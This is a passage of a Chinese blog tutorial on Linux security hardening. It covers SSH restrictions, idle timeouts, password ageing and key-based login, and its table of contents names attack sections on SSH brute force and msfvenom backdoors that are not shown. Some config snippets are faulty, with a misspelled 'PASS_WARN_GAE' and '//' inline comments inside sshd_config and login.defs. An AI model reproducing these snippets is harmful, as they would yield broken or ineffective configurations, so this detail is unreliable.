+<li>操作系统是整个信息系统安全的基础</li>
+<li>各种应用安全都依赖于操作系统</li>
+</ul>
+<p><strong>加固方式</strong></p>
+<ul>
+<li>手动修改加固项配置，或执行相关命令</li>
+<li>脚本或自动化工具批量加固，比如华为的openEuler-security加固服务</li>
+</ul>
+<p><strong>加固内容</strong></p>
+<ul>
+<li>系统服务、文件权限、内核参数、授权认证、账号口令</li>
+</ul>
+<h3 id="系统加固的影响"><a href="#系统加固的影响" class="headerlink" title="系统加固的影响"></a>系统加固的影响</h3><ul>
+<li>可能会影响用户的使用习惯，影响系统易用性</li>
+</ul>
+<p><img src="/../img/img_artical/net_sec/10.4.2.png" alt="10.4.2"></p>
+<h3 id="禁止root远程ssh"><a href="#禁止root远程ssh" class="headerlink" title="禁止root远程ssh"></a>禁止root远程ssh</h3><ul>
+<li>调整sshd服务端配置文件</li>
+</ul>
+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">vim</span> <span class="string">/etc/ssh/sshd_config</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Port</span> <span class="string">12345                          //修改默认连接端口为12345</span></span><br><span class="line"><span class="attr">LoginGraceTime</span> <span class="string">1m                   //修改用户登录验证过程的时长1分钟</span></span><br><span class="line"><span class="attr">PermitRootLogin</span> <span class="string">no                  //禁止root远程登录（不影响sudo提权）</span></span><br><span class="line"><span class="attr">MaxAuthTries</span> <span class="string">2                      //单次连接最多重试2次验证</span></span><br><span class="line"><span class="attr">AllowUsers</span> <span class="string">zhangsan@192.168.10.224</span></span><br><span class="line"><span class="attr">//添加白名单，仅允许zhangsan用户在192.168.10.224上访问</span></span><br><span class="line"></span><br><span class="line"><span class="attr">/etc/init.d/ssh</span> <span class="string">restart            //重启试试服务器</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="命令行超时限制"><a href="#命令行超时限制" class="headerlink" title="命令行超时限制"></a>命令行超时限制</h3><p><strong>针对后续登录的所有用户</strong></p>
+<ul>
+<li>调整&#x2F;etc&#x2F;profile文件中的TMOUT变量值</li>
+</ul>
+<p><strong>针对通过SSH登录的用户</strong></p>
+<ul>
+<li>调整&#x2F;etc&#x2F;ssh&#x2F;sshd_config文件中的ClientAliveInterval值</li>
+</ul>
+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">vim</span> <span class="string">/etc/profile</span></span><br><span class="line"></span><br><span class="line"><span class="attr">export</span> <span class="string">TMOUT=300       //闲置300秒自动退出</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="密码有效期限"><a href="#密码有效期限" class="headerlink" title="密码有效期限"></a>密码有效期限</h3><p><strong>调整&#x2F;etc&#x2F;login.defs配置文件</strong></p>
+<ul>
+<li>此文件定义了useradd的默认设置，会影响后续新创建的用户</li>
+<li>若有需要，也可用chage命令直接设置特定用户的密码参数</li>
+</ul>
+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">vim</span> <span class="string">/etc/login.defs              //设置新建用户时的默认密码有效期</span></span><br><span class="line"></span><br><span class="line"><span class="attr">PASS_MAX_DAYS</span> <span class="string">90                 //密码有效天数</span></span><br><span class="line"><span class="attr">PASS_WARN_GAE</span> <span class="string">7                  //密码过期前警告天数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">chage</span> <span class="string">-M 180 root              //设置root用户密码有效期为180天</span></span><br><span class="line"><span class="attr">chage</span> <span class="string">-l root</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="对称加密"><a href="#对称加密" class="headerlink" title="对称加密"></a>对称加密</h3><p><strong>对称加密</strong></p>
+<ul>
+<li>加密和解密速度快，效率高</li>
+<li>加密和解密使用相同的密钥，所以叫对称加密</li>
+<li>对称加密包含多种算法，如：DES、3DES、AES</li>
+<li>加密长度一般小于256位</li>
+<li>防止数据泄露</li>
+</ul>
+<h3 id="非对称加密"><a href="#非对称加密" class="headerlink" title="非对称加密"></a>非对称加密</h3><p><strong>非对称加密（密钥对）</strong></p>
+<ul>
+<li>由公钥和私钥组成，两个密钥相互加密和解密</li>
+<li>用公钥对数据进行加密，用对应的私钥才能解密</li>
+<li>用私钥对数据进行加密，用对应的公钥才能解密</li>
+<li>非对称加密常用算法：RSA、DSA(数字签名算法</li>
+<li>加密长度一般为512、1024、2048等</li>
+<li>加密和解密速度较慢</li>
+</ul>
+<h3 id="密码对访问Linux"><a href="#密码对访问Linux" class="headerlink" title="密码对访问Linux"></a>密码对访问Linux</h3><p><strong>用MobaXterm新建本地终端</strong></p>
+<p><img src="/../img/img_artical/net_sec/10.4.3.png" alt="10.4.3"></p>
+<p><strong>检查原来是否生成过秘钥文件，如果有删除即可</strong></p>
+<p><img src="/../img/img_artical/net_sec/10.4.4.png" alt="10.4.4"></p>
+<p><strong>第一步：创建秘钥对</strong></p>
+<ul>
+<li>使用MobaXterm生成公钥、私钥</li>
+</ul>
+<p><img src="/../img/img_artical/net_sec/10.4.5.png" alt="10.4.5"></p>
+<ul>
+<li>公私钥保存位置</li>
+</ul>
+<p><img src="/../img/img_artical/net_sec/10.4.6.png" alt="10.4.6"></p>
+<p><strong>第二步：拷贝公钥到Linux系统</strong></p>
+<p><img src="/../img/img_artical/net_sec/10.4.7.png" alt="10.4.7"></p>
+<ul>
+<li>在Linux中验证是否上传成功</li>
+</ul>
+<p><img src="/../img/img_artical/net_sec/10.4.8.png" alt="10.4.8"></p>
+<p><strong>第三步：修改配置文件，禁止使用密码登录Linux系统</strong></p>
+<p><img src="/../img/img_artical/net_sec/10.4.9.png" alt="10.4.9"></p>
+<ul>
+<li>重启SSH服务</li>
+</ul>
+<p><img src="/../img/img_artical/net_sec/10.4.10.png" alt="10.4.10"></p>
+<p><strong>第四步：在MobaXterm中，使用SSH连接目标主机</strong></p>
+<p><img src="/../img/img_artical/net_sec/10.4.11.png" alt="10.4.11"></p>
+<h3 id="其他加固措施"><a href="#其他加固措施" class="headerlink" title="其他加固措施"></a>其他加固措施</h3><ul>
+<li>系统服务加固：SSH&#x2F;WEB&#x2F;数据库&#x2F;FTP等</li>
+<li>文件权限：rwx控制&#x2F;删除无主文件&#x2F;删除空链接&#x2F;umask调整</li>
+<li>内核参数：禁ping&#x2F;禁转发&#x2F;禁ICMP重定向&#x2F;SYN cookie保护</li>
+<li>SELinux策略：强保护&#x2F;服务策略&#x2F;端口策略&#x2F;安全上下文</li>
+<li>授权认证：远程限制&#x2F;GRUB加密&#x2F;禁止交互启动</li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://www.nicopilot.online">Nicopilot</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://www.nicopilot.online/posts/lnxpte4.html">https://www.nicopilot.online/posts/lnxpte4.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://www.nicopilot.online" target="_blank">Nicopilot</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Linux%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">Linux渗透测试</a></div><div class="post_share"><div class="social-share" data-image="/img/cover/net_sec/10_cover.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/lnxpte5.html" title="网络安全-Linux渗透测试5"><img class="cover" src="/img/cover/net_sec/10_cover.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">网络安全-Linux渗透测试5</div></div></a></div><div class="next-post pull-right"><a href="/posts/lnxpte3.html" title="网络安全-Linux渗透测试3"><img class="cover" src="/img/cover/net_sec/10_cover.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">网络安全-Linux渗透测试3</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/lnxpte2.html" title="网络安全-Linux渗透测试2"><img class="cover" src="/img/cover/net_sec/10_cover.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-05-11</div><div class="title">网络安全-Linux渗透测试2</div></div></a></div><div><a href="/posts/lnxpte1.html" title="网络安全-Linux渗透测试1"><img class="cover" src="/img/cover/net_sec/10_cover.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-05-11</div><div class="title">网络安全-Linux渗透测试1</div></div></a></div><div><a href="/posts/lnxpte3.html" title="网络安全-Linux渗透测试3"><img class="cover" src="/img/cover/net_sec/10_cover.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-05-11</div><div class="title">网络安全-Linux渗透测试3</div></div></a></div><div><a href="/posts/lnxpte5.html" title="网络安全-Linux渗透测试5"><img class="cover" src="/img/cover/net_sec/10_cover.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-05-11</div><div class="title">网络安全-Linux渗透测试5</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Linux%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><span class="toc-number">1.</span> <span class="toc-text">Linux渗透测试</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux%E6%B8%97%E9%80%8F"><span class="toc-number">1.1.</span> <span class="toc-text">Linux渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Secure-Shell"><span class="toc-number">1.1.1.</span> <span class="toc-text">Secure Shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="toc-number">1.1.2.</span> <span class="toc-text">SSH暴力破解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH%E7%88%86%E7%A0%B4"><span class="toc-number">1.1.3.</span> <span class="toc-text">SSH爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8VSFTPD"><span class="toc-number">1.1.4.</span> <span class="toc-text">漏洞利用VSFTPD</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux%E5%90%8E%E9%97%A8"><span class="toc-number">1.2.</span> <span class="toc-text">Linux后门</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFMsfvenom"><span class="toc-number">1.2.1.</span> <span class="toc-text">什么是Msfvenom</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Msfvenom%E7%94%9F%E6%88%90%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6"><span class="toc-number">1.2.2.</span> <span class="toc-text">Msfvenom生成后门文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6%E8%87%B3%E9%9D%B6%E6%9C%BA"><span class="toc-number">1.2.3.</span> <span class="toc-text">上传后门文件至靶机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%99%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6%E6%B7%BB%E5%8A%A0%E6%89%A7%E8%A1%8C%E6%9D%83%E9%99%90"><span class="toc-number">1.2.4.</span> <span class="toc-text">给后门文件添加执行权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BB%BA%E7%AB%8B%E8%BF%9E%E6%8E%A5"><span class="toc-number">1.2.5.</span> <span class="toc-text">建立连接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-number">1.2.6.</span> <span class="toc-text">创建计划任务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AA%E5%8A%A8%E8%BF%90%E8%A1%8C%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6"><span class="toc-number">1.2.7.</span> <span class="toc-text">自动运行后门文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%9A%E8%AF%9D%E6%94%BE%E5%85%A5%E5%90%8E%E5%8F%B0%E8%BF%90%E8%A1%8C"><span class="toc-number">1.2.8.</span> <span class="toc-text">会话放入后台运行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%9A%E4%BC%9A%E8%AF%9D%E7%AE%A1%E7%90%86"><span class="toc-number">1.2.9.</span> <span class="toc-text">多会话管理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA"><span class="toc-number">1.3.</span> <span class="toc-text">Linux安全加固</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux%E5%AE%89%E5%85%A8%E5%9F%BA%E7%BA%BF"><span class="toc-number">1.3.1.</span> <span class="toc-text">Linux安全基线</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E5%8A%A0%E5%9B%BA%E7%9A%84%E5%BF%85%E8%A6%81%E6%80%A7"><span class="toc-number">1.3.2.</span> <span class="toc-text">系统加固的必要性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E5%8A%A0%E5%9B%BA%E7%9A%84%E5%BD%B1%E5%93%8D"><span class="toc-number">1.3.3.</span> <span class="toc-text">系统加固的影响</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A6%81%E6%AD%A2root%E8%BF%9C%E7%A8%8Bssh"><span class="toc-number">1.3.4.</span> <span class="toc-text">禁止root远程ssh</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E8%A1%8C%E8%B6%85%E6%97%B6%E9%99%90%E5%88%B6"><span class="toc-number">1.3.5.</span> <span class="toc-text">命令行超时限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E6%9C%89%E6%95%88%E6%9C%9F%E9%99%90"><span class="toc-number">1.3.6.</span> <span class="toc-text">密码有效期限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86"><span class="toc-number">1.3.7.</span> <span class="toc-text">对称加密</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86"><span class="toc-number">1.3.8.</span> <span class="toc-text">非对称加密</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E5%AF%B9%E8%AE%BF%E9%97%AELinux"><span class="toc-number">1.3.9.</span> <span class="toc-text">密码对访问Linux</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E5%8A%A0%E5%9B%BA%E6%8E%AA%E6%96%BD"><span class="toc-number">1.3.10.</span> <span class="toc-text">其他加固措施</span></a></li></ol></li></ol></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 By Nicopilot</div><div class="footer_custom_text">有一分热，发一分光，此后如竟没有炬火，我便是唯一的光</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><div class="js-pjax"></div><link rel="stylesheet" href="/css/custom.css" media="defer" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener
+  btf.removeGlobalFnEvent('pjax')
+  btf.removeGlobalFnEvent('themeChange')
+
+  document.getElementById('rightside').classList.remove('rightside-show')
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+  typeof disqusjs === 'object' && disqusjs.destroy()
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', e => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div><!-- hexo injector body_end start --><script data-pjax>
+    function butterfly_categories_card_injector_config(){
+      var parent_div_git = document.getElementById('recent-posts');
+      var item_html = '<style>li.categoryBar-list-item{width:32.3%;}.categoryBar-list{max-height: 380px;overflow:auto;}.categoryBar-list::-webkit-scrollbar{width:0!important}@media screen and (max-width: 650px){.categoryBar-list{max-height: 320px;}}</style><div class="recent-post-item" style="height:auto;width:100%;padding:0px;"><div id="categoryBar"><ul class="categoryBar-list"><li class="categoryBar-list-item" style="background:url(img/cover/net_sec/cover.png);"> <a class="categoryBar-list-link" onclick="pjax.loadUrl(&quot;categories/网络安全（更新ing）/&quot;);" href="javascript:void(0);">网络安全（更新ing）</a><span class="categoryBar-list-count">61</span><span class="categoryBar-list-descr">网络安全（更新ing）</span></li></ul></div></div>';
+      console.log('已挂载butterfly_categories_card')
+      parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+      }
+    if( document.getElementById('recent-posts') && (location.pathname ==='/'|| '/' ==='all')){
+    butterfly_categories_card_injector_config()
+    }
+  </script><script data-pjax>
+  function butterfly_swiper_injector_config(){
+    var parent_div_git = document.getElementById('recent-posts');
+    var item_html = '<div class="recent-post-item" style="height: auto;width: 100%"><div class="blog-slider swiper-container-fade swiper-container-horizontal" id="swiper_container"><div class="blog-slider__wrp swiper-wrapper" style="transition-duration: 0ms;"><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;posts/netbase1.html&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src="img/cover/net_sec/1_cover.png" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2024-04-30</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;posts/netbase1.html&quot;);" href="javascript:void(0);" alt="">网络安全-网络应用基础1</a><div class="blog-slider__text">该系列教程旨在让初学者理解网络与网络安全的基本概念🥧本节讲述TCP/IP协议的内容及通信三要素</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;posts/netbase1.html&quot;);" href="javascript:void(0);" alt="">详情       </a></div></div></div><div class="blog-slider__pagination swiper-pagination-clickable swiper-pagination-bullets"></div></div></div>';
+    console.log('已挂载butterfly_swiper')
+    parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+    }
+  var elist = 'undefined'.split(',');
+  var cpage = location.pathname;
+  var epage = 'all';
+  var flag = 0;
+
+  for (var i=0;i<elist.length;i++){
+    if (cpage.includes(elist[i])){
+      flag++;
+    }
+  }
+
+  if ((epage ==='all')&&(flag == 0)){
+    butterfly_swiper_injector_config();
+  }
+  else if (epage === cpage){
+    butterfly_swiper_injector_config();
+  }
+  </script><script defer src="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper.min.js"></script><script defer data-pjax src="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper_init.js"></script><!-- hexo injector body_end end --></body></html>
